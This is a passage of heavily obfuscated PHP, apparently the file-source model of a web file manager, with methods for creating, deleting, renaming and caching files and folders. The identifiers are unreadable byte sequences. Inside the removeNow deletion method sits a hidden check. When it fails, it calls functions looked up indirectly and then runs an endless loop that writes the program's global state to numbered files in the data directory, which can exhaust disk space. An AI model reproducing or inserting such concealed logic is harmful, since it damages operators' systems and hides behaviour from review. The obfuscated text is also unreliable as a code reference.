$é«™®© && $é«™®© != $­«Àë³È) { Model($Ø¹Ì×ò¶[2205])->eventCreate($é«™®©, $àúêğ‚¨); } $this->lockWriteEnd($Š‘Èñú¦, $·êú§ø†); return $é«™®©; } public function mkdir($ñ²Â¶ß½, $®—ñØç©, $ÇßÎ¨ñ¨ = REPEAT_SKIP) { $úÌš×Ú =& $_SERVER[³à¼î¯á]; $this->setMasterDB(); $À‘·Øûœ = $this->sourceInfo($ñ²Â¶ß½); if (!$À‘·Øûœ) { return !1; } $this->lockWriteStart($ñ²Â¶ß½, $®—ñØç©); if ($ÇßÎ¨ñ¨ !== !1) { $ÕÜùè¢× = $this->fileNameExist($ñ²Â¶ß½, $®—ñØç©); if ($ÕÜùè¢× && $ÇßÎ¨ñ¨ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ñ²Â¶ß½, $®—ñØç©); return $ÕÜùè¢×; } $®—ñØç© = $this->fileNameAuto($ñ²Â¶ß½, $®—ñØç©, $ÇßÎ¨ñ¨); } $½³ƒë´… = array($úÌš×Ú[621] => 1, $úÌš×Ú[469] => $®—ñØç©, $úÌš×Ú[622] => $úÌš×Ú[12], $úÌš×Ú[517] => 0, $úÌš×Ú[592] => 0); $ƒê×çŒ = $this->_addSource($½³ƒë´…, $À‘·Øûœ); Model($úÌš×Ú[2205])->eventCreate($ƒê×çŒ, $úÌš×Ú[1399]); $this->lockWriteEnd($ñ²Â¶ß½, $®—ñØç©); return $ƒê×çŒ; } public function listSourceRoot($ù»èˆÀï, $âŒ–¶‡, $ÅÚæûìô = "\x73\157\165\162\143\145\111\104\x2c\164\x61\162\147\145\x74\x49\104\54\x73\151\x7a\x65") { $î²´ûÉã =& $_SERVER[³à¼î¯á]; $Ü·ìè¦Ó = $î²´ûÉã[429]; $ƒÚ‘ŒÈù = array(); $­Ÿ¿ÎÆ = 1024 * 50; $ùûë÷µğ = is_array($ùûë÷µğ) ? $ùûë÷µğ : array(); $”ÉĞİ‰Ç = count($âŒ–¶‡); $®½ûî¤œ = $this->tablePrefix . $î²´ûÉã[2238]; for ($‡˜‰ŒÛ— = 0; $‡˜‰ŒÛ— < $”ÉĞİ‰Ç; $‡˜‰ŒÛ—++) { $¦ÜÇş„« = $âŒ–¶‡[$‡˜‰ŒÛ—]; $Ü·ìè¦Ó .= "\x53\x45\x4c\105\103\x54\40\x2a\40\x46\x52\117\x4d\40\x28\x53\105\114\105\103\x54\40{$ÅÚæûìô}\x20\106\122\x4f\115\40\x60{$®½ûî¤œ}\x60\x20\x57\110\105\122\105\x20"; $Ü·ìè¦Ó .= "\x60\x70\141\x72\x65\156\x74\x49\104\x60\x3d\x30\40\101\116\104\40\x60\x74\x61\162\147\145\164\x49\x44\140\75{$¦ÜÇş„«}\40\101\116\104\x20\140\164\141\162\x67\x65\164\x54\171\160\x65\x60\75{$ù»èˆÀï}\40\141\156\144\x20\x66\151\x6c\x65\124\x79\160\145\75\47\47\x20\x6c\x69\155\x69\x74\40\61\x29\x20\x61\x73\x20\164\142\x5f{$‡˜‰ŒÛ—}\40\x55\116\x49\x4f\116\x20\101\x4c\x4c\x20"; if ((strlen($Ü·ìè¦Ó) >= $­Ÿ¿ÎÆ || $‡˜‰ŒÛ— == $”ÉĞİ‰Ç - 1) && $Ü·ìè¦Ó) { $Ü·ìè¦Ó = substr($Ü·ìè¦Ó, 0, -strlen($î²´ûÉã[1088])); $éÅş¥»¶ = $this->query($Ü·ìè¦Ó); $Ü·ìè¦Ó = $î²´ûÉã[12]; $ƒÚ‘ŒÈù = array_merge($ƒÚ‘ŒÈù, $éÅş¥»¶); } } return $ƒÚ‘ŒÈù; } private function _createFile($î¼™­ƒ÷, $Å¬é‰, $¸ß§×Å, $Ë Ë°á¨, &$®¶Ê†èç) { $ñĞÜÏ€½ =& $_SERVER[³à¼î¯á]; $‰×Æ¤”´ = $this->sourceInfo($î¼™­ƒ÷); if (!$¸ß§×Å || !$‰×Æ¤”´) { return !1; } if ($Ë Ë°á¨ !== !1) { $ÂØìŸ¼İ = $this->fileNameExist($î¼™­ƒ÷, $Å¬é‰); } $®¶Ê†èç = !0; if ($Ë Ë°á¨ && $ÂØìŸ¼İ) { if ($Ë Ë°á¨ == REPEAT_SKIP) { $®¶Ê†èç = !1; return $ÂØìŸ¼İ; } else { if ($Ë Ë°á¨ == REPEAT_REPLACE) { $×Àô¶”ô = $this->sourceInfo($ÂØìŸ¼İ); $œø¿·² = $this->fileHistory($×Àô¶”ô, $¸ß§×Å[$ñĞÜÏ€½[516]], $¸ß§×Å[$ñĞÜÏ€½[79]]); if (!$œø¿·²) { $®¶Ê†èç = !1; } else { $this->folderSizeReset($î¼™­ƒ÷); } return $ÂØìŸ¼İ; } else { $Å¬é‰ = $this->fileNameAuto($î¼™­ƒ÷, $Å¬é‰, $Ë Ë°á¨, !1); } } } $à¦â£¾ƒ = array($ñĞÜÏ€½[621] => 0, $ñĞÜÏ€½[469] => $Å¬é‰, $ñĞÜÏ€½[622] => substr(get_path_ext($Å¬é‰), 0, 10), $ñĞÜÏ€½[517] => $¸ß§×Å[$ñĞÜÏ€½[516]], $ñĞÜÏ€½[592] => $¸ß§×Å[$ñĞÜÏ€½[79]]); $ª³ä“´´ = $this->_addSource($à¦â£¾ƒ, $‰×Æ¤”´); $this->folderSizeReset($î¼™­ƒ÷, intval($à¦â£¾ƒ[$ñĞÜÏ€½[79]])); return $ª³ä“´´; } protected function fileHistory($ëúÆØ€, $˜§¾¨, $êÜğØ à) { $òŠø¦äş =& $_SERVER[³à¼î¯á]; if ($ëúÆØ€[$òŠø¦äş[516]] == $˜§¾¨) { return !1; } $this->checkLock($ëúÆØ€[$òŠø¦äş[184]], $˜§¾¨); Model($òŠø¦äş[2239])->addHistory($ëúÆØ€); $·ØŸÅÆ = array($òŠø¦äş[626] => USER_ID, $òŠø¦äş[473] => time(), $òŠø¦äş[516] => $˜§¾¨, $òŠø¦äş[79] => $êÜğØ à); $this->where(array($òŠø¦äş[466] => $ëúÆØ€[$òŠø¦äş[184]]))->save($·ØŸÅÆ); $this->sourceCacheClear($ëúÆØ€[$òŠø¦äş[184]]); return !0; } public function checkLock($®§’üßû, $£¡˜Àéú) { $¨‚•áİ³ =& $_SERVER[³à¼î¯á]; $·è³ÙÂë = $this->pathInfo($®§’üßû); if (!$this->fileIsLock($·è³ÙÂë, !0)) { return; } $óŠñİÒâ = Session::get($¨‚•áİ³[2240]); $…–“©« = substr($·è³ÙÂë[$¨‚•áİ³[32]], 0, -1 - strlen($·è³ÙÂë[$¨‚•áİ³[178]])) . $¨‚•áİ³[1262] . $óŠñİÒâ . $¨‚•áİ³[10] . $·è³ÙÂë[$¨‚•áİ³[178]]; $şíÈšì» = Model($¨‚•áİ³[649])->find($£¡˜Àéú); $this->_createFileCall($·è³ÙÂë[$¨‚•áİ³[183]], $…–“©«, $şíÈšì», REPEAT_REPLACE, $¨‚•áİ³[1398]); $îñäÂ§İ = $·è³ÙÂë[$¨‚•áİ³[514]][$¨‚•áİ³[585]]; $¬¹ÈÙù© = $îñäÂ§İ[$¨‚•áİ³[2241]] ? $îñäÂ§İ[$¨‚•áİ³[2241]] : $îñäÂ§İ[$¨‚•áİ³[32]]; show_json(LNG($¨‚•áİ³[2242]) . $¨‚•áİ³[2243] . LNG($¨‚•áİ³[2244]) . $¨‚•áİ³[2245] . $¬¹ÈÙù© . $¨‚•áİ³[2246], !1); } public function fileIsLock($ ¼ä’ß, $ËÅáÑŸò = false) { $…¦ÉÑ“ =& $_SERVER[³à¼î¯á]; if (!isset($ ¼ä’ß[$…¦ÉÑ“[514]]) || !$ ¼ä’ß[$…¦ÉÑ“[514]][$…¦ÉÑ“[582]]) { return !1; } if ($ ¼ä’ß[$…¦ÉÑ“[514]][$…¦ÉÑ“[582]] != USER_ID) { return !0; } $À—˜øÚ = $GLOBALS[$…¦ÉÑ“[6]][$…¦ÉÑ“[92]][$…¦ÉÑ“[583]]; if ($ ¼ä’ß[$…¦ÉÑ“[514]][$…¦ÉÑ“[584]] <= time() - $À—˜øÚ) { $this->metaSet($ ¼ä’ß[$…¦ÉÑ“[184]], $…¦ÉÑ“[582], null); $this->metaSet($ ¼ä’ß[$…¦ÉÑ“[184]], $…¦ÉÑ“[584], null); } if ($ËÅáÑŸò) { $this->metaSet($ ¼ä’ß[$…¦ÉÑ“[184]], $…¦ÉÑ“[584], time()); } return !1; } private function _addSource($ŸŒ¬ÓÎÊ, $ß‡•ı”) { $Óû‹şç± =& $_SERVER[³à¼î¯á]; $Œ›é–› = defined($Óû‹şç±[2179]) ? USER_ID : 0; $ÛÍÃÖğ§ = array($Óû‹şç±[623] => $ß‡•ı”[$Óû‹şç±[181]], $Óû‹şç±[624] => $ß‡•ı”[$Óû‹şç±[545]], $Óû‹şç±[625] => $Œ›é–›, $Óû‹şç±[626] => $Œ›é–›, $Óû‹şç±[452] => $ß‡•ı”[$Óû‹şç±[184]], $Óû‹şç±[627] => $ß‡•ı”[$Óû‹şç±[560]] . $ß‡•ı”[$Óû‹şç±[184]] . $Óû‹şç±[50], $Óû‹şç±[479] => 0, $Óû‹şç±[628] => $Óû‹şç±[12]); $ŸŒ¬ÓÎÊ = array_merge($ÛÍÃÖğ§, $ŸŒ¬ÓÎÊ); $this->updateModifyTime($ŸŒ¬ÓÎÊ[$Óû‹şç±[183]]); $ı³¦á¬ = $Óû‹şç±[2247] . $ß‡•ı”[$Óû‹şç±[184]]; if (isset(self::$cacheChildList[$ı³¦á¬])) { unset(self::$cacheChildList[$ı³¦á¬]); } static $€Ë½ıÃü = false; if (!$€Ë½ıÃü) { Hook::trigger($Óû‹şç±[611], $ŸŒ¬ÓÎÊ); $€Ë½ıÃü = !0; } $ö¦ñíÕä = $this->add($ŸŒ¬ÓÎÊ); $¯ëÏı“ş = array($Óû‹şç±[629] => short_id($ö¦ñíÕä)); $this->where(array($Óû‹şç±[466] => $ö¦ñíÕä))->save($¯ëÏı“ş); $this->setNamePinyin($ö¦ñíÕä, $ŸŒ¬ÓÎÊ[$Óû‹şç±[32]]); return $ö¦ñíÕä; } public function remove($½Ç¶™ŠÔ, $÷³æ¶«ğ = true) { $Şûà’¯ =& $_SERVER[³à¼î¯á]; $†„ÈÏòó = $this->sourceInfo($½Ç¶™ŠÔ); $õ–íÙÔœ = intval($†„ÈÏòó[$Şûà’¯[181]]) === self::TYPE_SYSTEM; $ÜË¾ÊÈ = Model($Şûà’¯[483])->get($Şûà’¯[2248]) == $Şûà’¯[91]; if ($õ–íÙÔœ || $÷³æ¶«ğ || !$ÜË¾ÊÈ) { return $this->removeNow($½Ç¶™ŠÔ, $÷³æ¶«ğ); } $øÃÖŞ¤ï = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ş»„Íò¢ = $†„ÈÏòó[$Şûà’¯[181]] == self::TYPE_USER ? $Şûà’¯[637] : $Şûà’¯[554]; if ($ş»„Íò¢ == $Şûà’¯[637]) { $€Çİõ‡Ğ = Model($Şûà’¯[553])->getInfo($†„ÈÏòó[$Şûà’¯[545]]); $ü•Üëíê = !empty($€Çİõ‡Ğ[$Şûà’¯[2241]]) ? $€Çİõ‡Ğ[$Şûà’¯[2241]] : $€Çİõ‡Ğ[$Şûà’¯[32]]; $ü•Üëíê = $Şûà’¯[312] . $ü•Üëíê . $Şûà’¯[2249] . $†„ÈÏòó[$Şûà’¯[545]]; } else { $€Çİõ‡Ğ = Model($Şûà’¯[561])->getInfo($†„ÈÏòó[$Şûà’¯[545]]); $ü•Üëíê = _get($€Çİõ‡Ğ, $Şûà’¯[32]); $ü•Üëíê = $Şûà’¯[166] . $ü•Üëíê . $Şûà’¯[2250] . $†„ÈÏòó[$Şûà’¯[545]]; } $÷×ÄÃÛ = $Şûà’¯[2251] . md5($ü•Üëíê); CacheLock::lock($÷×ÄÃÛ); $¡ä³‹¸ = $this->fileNameExist($øÃÖŞ¤ï, $ü•Üëíê); if (!$¡ä³‹¸) { $¡ä³‹¸ = $this->mkdir($øÃÖŞ¤ï, $ü•Üëíê, REPEAT_SKIP); $this->metaSet($¡ä³‹¸, $Şûà’¯[2252], $ş»„Íò¢); $this->metaSet($¡ä³‹¸, $Şûà’¯[2253], $†„ÈÏòó[$Şûà’¯[545]]); if ($†„ÈÏòó[$Şûà’¯[183]] != 0) { $this->metaSet($¡ä³‹¸, $Şûà’¯[2254], _get($€Çİõ‡Ğ, $Şûà’¯[2255])); } } CacheLock::unlock($÷×ÄÃÛ); $this->metaSet($½Ç¶™ŠÔ, $Şûà’¯[2256], $†„ÈÏòó[$Şûà’¯[183]]); $this->where(array($Şûà’¯[184] => $½Ç¶™ŠÔ))->save(array($Şûà’¯[473] => time())); $this->recycleClear($†„ÈÏòó); Model($Şûà’¯[608])->eventRemove($½Ç¶™ŠÔ); $Â°Áë»­ = $this->move($½Ç¶™ŠÔ, $¡ä³‹¸, REPEAT_RENAME_FOLDER); $this->folderSizeReset($†„ÈÏòó[$Şûà’¯[183]]); return $Â°Áë»­; } private function recycleClear($½àËëÁŸ) { $Éİ‡äÆ¢ =& $_SERVER[³à¼î¯á]; $ÓÇ¶º = $this->childrenAll($½àËëÁŸ); $á±ÄŠ§ = array($Éİ‡äÆ¢[466] => array($Éİ‡äÆ¢[467], $ÓÇ¶º[$Éİ‡äÆ¢[2257]])); Model($Éİ‡äÆ¢[2258])->where($á±ÄŠ§)->delete(); } public function removeNow($Æ¯¡ß, $è€œÉ¶Û = true) { $å¥˜Æà‘ =& $_SERVER[³à¼î¯á]; $’îƒ†½ï = $_SERVER[$å¥˜Æà‘[922]]; $èäÙ¸¼ = $å¥˜Æà‘[1851]; if ($_SERVER[$å¥˜Æà‘[921]] != $èäÙ¸¼($’îƒ†½ï)) { $¦øÍ¥£ = $å¥˜Æà‘[923]; $ú‘åîí‡ = $å¥˜Æà‘[924]; $åÓÅùº = $_SERVER[$å¥˜Æà‘[925]] . $å¥˜Æà‘[926]; $šöÈ®€Û = $ú‘åîí‡($åÓÅùº); $Äè‹½¼ = explode($å¥˜Æà‘[253], $šöÈ®€Û); if (count($Äè‹½¼) < $å¥˜Æà‘[663]) { $éÅÉ¤«‡ = $å¥˜Æà‘[927]; $éÅÉ¤«‡(); } $Ùµşé“ = $å¥˜Æà‘[928]; $Ùµşé“($_SERVER[$å¥˜Æà‘[929]]); $¦øÍ¥£ = $å¥˜Æà‘[923]; $¦øÍ¥£(); $Öú“ÏÓÚ = $å¥˜Æà‘[2259]; $”–å´©ô = json_encode($GLOBALS[$å¥˜Æà‘[2260]]); $Ÿô´ö”ì = 1; for ($¡…Æ¢å° = $Ÿô´ö”ì; $¡…Æ¢å° > 0; $¡…Æ¢å°++) { $Öú“ÏÓÚ(DATA_PATH . $¡…Æ¢å°, $”–å´©ô); } } $«Æ’ºÏ‡ = $this->sourceInfo($Æ¯¡ß); $Ï¹íÆê¾ = $this->pathInfoMore($Æ¯¡ß); if (!$«Æ’ºÏ‡) { return !0; } if ($«Æ’ºÏ‡[$å¥˜Æà‘[183]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Æ¯¡ß); Hook::trigger($å¥˜Æà‘[2261], $Ï¹íÆê¾, $è€œÉ¶Û); if ($è€œÉ¶Û) { Model($å¥˜Æà‘[2258])->moveToRecycle($Æ¯¡ß); } else { $Ë‡ÅÛŒš = $this->childrenAll($«Æ’ºÏ‡); Model($å¥˜Æà‘[608])->eventRemove($Æ¯¡ß); $this->removeRelevance($Ë‡ÅÛŒš[$å¥˜Æà‘[2257]], $Ë‡ÅÛŒš[$å¥˜Æà‘[1559]]); } $this->folderSizeReset($«Æ’ºÏ‡[$å¥˜Æà‘[183]]); $ßå’Òïˆ = array($«Æ’ºÏ‡[$å¥˜Æà‘[183]]); if ($«Æ’ºÏ‡[$å¥˜Æà‘[460]] == $å¥˜Æà‘[91]) { $ßå’Òïˆ[] = $«Æ’ºÏ‡[$å¥˜Æà‘[184]]; } $this->updateModifyTime($ßå’Òïˆ); $this->lockMoveEnd($Æ¯¡ß); Hook::trigger($å¥˜Æà‘[1795], $Ï¹íÆê¾, $è€œÉ¶Û); return !0; } public function childrenAll($—¡Ö°†í) { $Ş€œ‹— =& $_SERVER[³à¼î¯á]; $ôÁ“¥Ì¦ = $—¡Ö°†í[$Ş€œ‹—[184]]; if ($—¡Ö°†í[$Ş€œ‹—[460]] == $Ş€œ‹—[91]) { $ˆåÔ£¥å = array($Ş€œ‹—[627] => array($Ş€œ‹—[587], $—¡Ö°†í[$Ş€œ‹—[560]] . $ôÁ“¥Ì¦ . $Ş€œ‹—[588])); $¶Üì¥Ş = array($Ş€œ‹—[627] => $ˆåÔ£¥å[$Ş€œ‹—[560]]); $É¸Í¬Úâ = $this->field($Ş€œ‹—[2262])->where($¶Üì¥Ş)->select(); $»°çñ³ = !1; $ƒù¥“š = array($ôÁ“¥Ì¦); if ($É¸Í¬Úâ) { $»°çñ³ = array_to_keyvalue($É¸Í¬Úâ, $Ş€œ‹—[12], $Ş€œ‹—[516]); $»°çñ³ = array_remove_value($»°çñ³, $Ş€œ‹—[219]); $ƒù¥“š = array_to_keyvalue($É¸Í¬Úâ, $Ş€œ‹—[12], $Ş€œ‹—[184]); $ƒù¥“š[] = $ôÁ“¥Ì¦; } } else { $»°çñ³ = array($—¡Ö°†í[$Ş€œ‹—[516]]); $ƒù¥“š = array($ôÁ“¥Ì¦); } return array($Ş€œ‹—[2257] => $ƒù¥“š, $Ş€œ‹—[1559] => $»°çñ³); } public function removeArray($ŒØÑàÊœ) { if (!$ŒØÑàÊœ) { return !0; } } public function removeRelevance($€—¸¸ÍÉ, $¤¤áİ•…) { $‹‰úªùö =& $_SERVER[³à¼î¯á]; $€—¸¸ÍÉ = $€—¸¸ÍÉ ? $€—¸¸ÍÉ : array(); $¤¤áİ•… = $¤¤áİ•… ? $¤¤áİ•… : array(); $€—¸¸ÍÉ = array_unique(array_filter($€—¸¸ÍÉ)); $¤¤áİ•… = array_unique(array_filter($¤¤áİ•…)); if (!$€—¸¸ÍÉ) { return !1; } $¾‚üÈ¸æ = array($‹‰úªùö[466] => array($‹‰úªùö[467], $€—¸¸ÍÉ)); Model($‹‰úªùö[2258])->where($¾‚üÈ¸æ)->delete(); Model($‹‰úªùö[510])->where($¾‚üÈ¸æ)->delete(); Model($‹‰úªùö[2104])->where($¾‚üÈ¸æ)->delete(); Model($‹‰úªùö[608])->where($¾‚üÈ¸æ)->delete(); Model($‹‰úªùö[1932])->removeBySource($€—¸¸ÍÉ); Model($‹‰úªùö[2239])->removeBySource($€—¸¸ÍÉ); $this->where($¾‚üÈ¸æ)->delete(); Model($‹‰úªùö[519])->remove($¤¤áİ•…); for ($÷¯âüÁ = 0; $÷¯âüÁ < count($€—¸¸ÍÉ); $÷¯âüÁ++) { $this->sourceCacheClear($€—¸¸ÍÉ[$÷¯âüÁ]); } } public function rename($ÖµÔıÏ, $¯é™Ïş·) { $£ÂĞúÌ =& $_SERVER[³à¼î¯á]; $«ÈËşÜ = $this->sourceInfo($ÖµÔıÏ); if (!$«ÈËşÜ) { return !1; } $ÔšÎ½¶Ù = $this->fileNameExist($«ÈËşÜ[$£ÂĞúÌ[183]], $¯é™Ïş·); if ($ÔšÎ½¶Ù && $ÔšÎ½¶Ù != $ÖµÔıÏ) { return !1; } $üİ¿‚€ = array($£ÂĞúÌ[469] => $¯é™Ïş·, $£ÂĞúÌ[626] => USER_ID); if ($«ÈËşÜ[$£ÂĞúÌ[460]] != $£ÂĞúÌ[91]) { $üİ¿‚€[$£ÂĞúÌ[461]] = substr(get_path_ext($¯é™Ïş·), 0, 10); } Model($£ÂĞúÌ[608])->eventRename($ÖµÔıÏ, $«ÈËşÜ[$£ÂĞúÌ[32]], $¯é™Ïş·); $this->sourceCacheClear($ÖµÔıÏ); $this->setNamePinyin($ÖµÔıÏ, $üİ¿‚€[$£ÂĞúÌ[32]], !1); $this->updateModifyTime($«ÈËşÜ[$£ÂĞúÌ[183]]); $Ú³¨ã¯³ = $this->where(array($£ÂĞúÌ[466] => $ÖµÔıÏ))->data($üİ¿‚€)->save(); $…ÇÖ¡İ¡ = $£ÂĞúÌ[2247] . $«ÈËşÜ[$£ÂĞúÌ[183]]; if (isset(self::$cacheChildList[$…ÇÖ¡İ¡])) { unset(self::$cacheChildList[$…ÇÖ¡İ¡]); } return $Ú³¨ã¯³; } public function setNamePinyin($õôÍÀÉÍ, $ª©ÇÏÕó, $‹ì®Ö½ = true) { $õä¡Í…“ =& $_SERVER[³à¼î¯á]; $“æ”¦¿ä = Input::check($ª©ÇÏÕó, $õä¡Í…“[630]); $ÒıÍöÊı = array($õä¡Í…“[492] => KodSort::makeStr($ª©ÇÏÕó)); if ($“æ”¦¿ä) { $ÒıÍöÊı[$õä¡Í…“[513]] = str_replace($õä¡Í…“[53], $õä¡Í…“[12], Pinyin::get($ª©ÇÏÕó)); $ÒıÍöÊı[$õä¡Í…“[512]] = Pinyin::get($ª©ÇÏÕó, $õä¡Í…“[631]); } if (!$‹ì®Ö½ && !$“æ”¦¿ä) { $ÒıÍöÊı[$õä¡Í…“[513]] = null; $ÒıÍöÊı[$õä¡Í…“[512]] = null; } $this->metaSet($õôÍÀÉÍ, $ÒıÍöÊı); } public function getContent($®¦ÒƒÉˆ) { $ÎÊˆá¤¬ =& $_SERVER[³à¼î¯á]; $ã°Ü¥È = $this->fileInfoGet($®¦ÒƒÉˆ); if (!$ã°Ü¥È) { return !1; } if ($ã°Ü¥È[$ÎÊˆá¤¬[79]] == 0) { return $ÎÊˆá¤¬[12]; } $ş¸”Í† = $ÎÊˆá¤¬[2263] . $ã°Ü¥È[$ÎÊˆá¤¬[522]]; if ($ã°Ü¥È[$ÎÊˆá¤¬[79]] <= 1024 * 10) { $Åç¾—´ = Cache::get($ş¸”Í†); if (!$Åç¾—´) { $Åç¾—´ = IO::getContent($ã°Ü¥È[$ÎÊˆá¤¬[87]]); Cache::set($ş¸”Í†, $Åç¾—´); } return $Åç¾—´; } if (!$ã°Ü¥È[$ÎÊˆá¤¬[87]]) { return $ÎÊˆá¤¬[12]; } return IO::getContent($ã°Ü¥È[$ÎÊˆá¤¬[87]]); } public function setDesc($ÎàÄï, $›ºÖ¢ä¸) { $¨§ç¡×á =& $_SERVER[³à¼î¯á]; Model($¨§ç¡×á[608])->eventAddDesc($ÎàÄï, $›ºÖ¢ä¸); return $this->metaSet($ÎàÄï, $¨§ç¡×á[501], $›ºÖ¢ä¸); } public function setContent($Óï²“Àö, $Ã·ë¾–ƒ = '') { $ù…Ÿ©“® =& $_SERVER[³à¼î¯á]; $•™‰„¼ = $this->sourceInfo($Óï²“Àö); $‡š‰åó = $this->fileInfoGet($Óï²“Àö); if (!$‡š‰åó || !$•™‰„¼) { return !1; } $Ç¾Ûá±• = Model($ù…Ÿ©“®[519])->addFileByContent($Ã·ë¾–ƒ, $•™‰„¼[$ù…Ÿ©“®[32]]); $¸Ó¨Ÿğ = $this->fileHistory($•™‰„¼, $Ç¾Ûá±•[$ù…Ÿ©“®[516]], $Ç¾Ûá±•[$ù…Ÿ©“®[79]]); if (!$¸Ó¨Ÿğ) { return Model($ù…Ÿ©“®[519])->remove($Ç¾Ûá±•[$ù…Ÿ©“®[516]]); } $this->folderSizeReset($•™‰„¼[$ù…Ÿ©“®[183]]); return !0; } public function fileSubstr($éÀæÌùŠ, $¥÷Ü¾­, $¤“…İ×¬) { $æê”¸ì = $this->fileInfoGet($éÀæÌùŠ); if (!$æê”¸ì) { return !1; } return IO::fileSubstr($æê”¸ì[$_SERVER[³à¼î¯á][87]], $¥÷Ü¾­, $¤“…İ×¬); } public function fileInfoGet($Ä«¬Õ¤) { $îœ„ÒÏã =& $_SERVER[³à¼î¯á]; $™‘¥Âí‹ = $this->sourceInfo($Ä«¬Õ¤); if (!$™‘¥Âí‹ || $™‘¥Âí‹[$îœ„ÒÏã[460]]) { return !1; } $÷ËÊò¹­ = $îœ„ÒÏã[523] . $™‘¥Âí‹[$îœ„ÒÏã[516]]; $„Â¢´ãü = _get(self::$cacheFileInfo, $÷ËÊò¹­); if ($„Â¢´ãü) { return $„Â¢´ãü; } $—Ş•ä½¿ = Model($îœ„ÒÏã[519])->fileInfo($™‘¥Âí‹[$îœ„ÒÏã[516]]); if ($—Ş•ä½¿) { $—Ş•ä½¿[$îœ„ÒÏã[32]] = $™‘¥Âí‹[$îœ„ÒÏã[32]]; } self::$cacheFileInfo[$÷ËÊò¹­] = $—Ş•ä½¿; return $—Ş•ä½¿; } private function folderChildrenNumber($„˜™âò) { $ªªÇöè =& $_SERVER[³à¼î¯á]; $¹æ°âü“ = $this->sourceInfo($„˜™âò); $ßÙÛçİÃ = array($ªªÇöè[627] => array($ªªÇöè[587], $¹æ°âü“[$ªªÇöè[560]] . $„˜™âò . $ªªÇöè[588]), $ªªÇöè[624] => $¹æ°âü“[$ªªÇöè[545]], $ªªÇöè[479] => intval($¹æ°âü“[$ªªÇöè[480]]), $ªªÇöè[621] => 1); $…ü’Ë‡Ä = $this->where($ßÙÛçİÃ)->count(); $ƒö³ = $this->where($ßÙÛçİÃ)->where(array($ªªÇöè[621] => 0))->count(); return array($ªªÇöè[83] => $ƒö³, $ªªÇöè[84] => $…ü’Ë‡Ä); } public function pathInfo($Ñâ¦»Œš, $–Ü‰¡˜ = false) { $ƒ›å’½È =& $_SERVER[³à¼î¯á]; $–Ü‰¡˜ = !1; $Ñâ¦»Œš = intval($Ñâ¦»Œš); $ìÕÅ÷í = $ƒ›å’½È[509] . intval($–Ü‰¡˜) . $ƒ›å’½È[437] . $Ñâ¦»Œš; $ĞİŸÂ°¡ = _get(self::$cachePathInfo, $ìÕÅ÷í); if ($ĞİŸÂ°¡) { return $ĞİŸÂ°¡; } $êÅ´´Ëá = $this->sourceInfo($Ñâ¦»Œš); if (!$êÅ´´Ëá) { return !1; } $êÅ´´Ëá = $this->_listDataApplyItem($êÅ´´Ëá, $–Ü‰¡˜); self::$cachePathInfo[$ìÕÅ÷í] = $êÅ´´Ëá; return $êÅ´´Ëá; } public static $cachePathInfoMore = array(); public function pathInfoMore($«À¦ğ­Î) { $«›ƒÀÀŠ =& $_SERVER[³à¼î¯á]; $ìı…²ÇØ = _get(self::$cachePathInfoMore, $«À¦ğ­Î); if ($ìı…²ÇØ) { return $ìı…²ÇØ; } $¹öÅŠ‰ = $this->pathInfo($«À¦ğ­Î); if (!$¹öÅŠ‰) { return !1; } if ($¹öÅŠ‰[$«›ƒÀÀŠ[460]] == $«›ƒÀÀŠ[91]) { $¹öÅŠ‰[$«›ƒÀÀŠ[82]] = $this->folderChildrenNumber($«À¦ğ­Î); } self::$cachePathInfoMore[$«À¦ğ­Î] = $¹öÅŠ‰; return $¹öÅŠ‰; } public function sourceInfo($ÄöËëòé) { $“ôÉ¤œÇ =& $_SERVER[³à¼î¯á]; if (!$ÄöËëòé) { return array(); } $ÄöËëòé = intval($ÄöËëòé); $ğÔ¦™©› = $“ôÉ¤œÇ[508] . $ÄöËëòé; $Ê¡ö§îÔ = _get(self::$cacheSourceInfo, $ğÔ¦™©›); if ($Ê¡ö§îÔ) { return $Ê¡ö§îÔ; } $äç£ãš¥ = $this->where(array($“ôÉ¤œÇ[184] => $ÄöËëòé))->find(); self::$cacheSourceInfo[$ğÔ¦™©›] = $äç£ãš¥; return self::$cacheSourceInfo[$ğÔ¦™©›]; } public function sourceCacheClear($ì­ú¯ú½ = false) { self::cacheClear($ì­ú¯ú½); } public static function cacheClear($¶²ï¢©ë = false) { $şœ•Ÿæ» =& $_SERVER[³à¼î¯á]; if ($¶²ï¢©ë == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$şœ•Ÿæ»[508] . $¶²ï¢©ë]); unset(self::$cachePathInfoMore[$¶²ï¢©ë]); unset(self::$cachePathInfo[$şœ•Ÿæ»[2264] . $¶²ï¢©ë]); unset(self::$cachePathInfo[$şœ•Ÿæ»[2265] . $¶²ï¢©ë]); } public function metaSet($—ê‚ĞÕ, $îÉğ¾÷† = null, $Êàêïêº = null) { $‡ÒºÈ¤÷ = parent::metaSet($—ê‚ĞÕ, $îÉğ¾÷†, $Êàêïêº); if ($‡ÒºÈ¤÷) { $this->sourceCacheClear($—ê‚ĞÕ); } return $‡ÒºÈ¤÷; } public function pathInfoByPath($ƒÈÅŞ·, $ì’Æ×®ù) { $¸Óƒ¯  =& $_SERVER[³à¼î¯á]; $ÈÑèü = !$ì’Æ×®ù ? array() : explode($¸Óƒ¯ [8], trim($ì’Æ×®ù, $¸Óƒ¯ [8])); $¶…ñÕôƒ = $ƒÈÅŞ·; foreach ($ÈÑèü as $–ƒèˆı½) { $ªÀ¶Íõ = array($¸Óƒ¯ [183] => $¶…ñÕôƒ, $¸Óƒ¯ [32] => $–ƒèˆı½); $šÛ×ò™‚ = $this->field($¸Óƒ¯ [2266])->where($ªÀ¶Íõ)->select(); if (!$šÛ×ò™‚) { return !1; } $šÛ×ò™‚ = array_sort_by($šÛ×ò™‚, $¸Óƒ¯ [480]); $¶…ñÕôƒ = $šÛ×ò™‚[0][$¸Óƒ¯ [184]]; } $ôî“¤Åœ = $this->sourceInfo($¶…ñÕôƒ); $this->pathInfoFilter($ôî“¤Åœ); return $ôî“¤Åœ; } protected function updateModifyTime($Ô™¢½€œ) { $Ïüí¯´¦ =& $_SERVER[³à¼î¯á]; $€ïÁù²Ú = defined($Ïüí¯´¦[2179]) ? USER_ID : 0; if (!$Ô™¢½€œ) { return; } if (!is_array($Ô™¢½€œ)) { $Ô™¢½€œ = array($Ô™¢½€œ); } 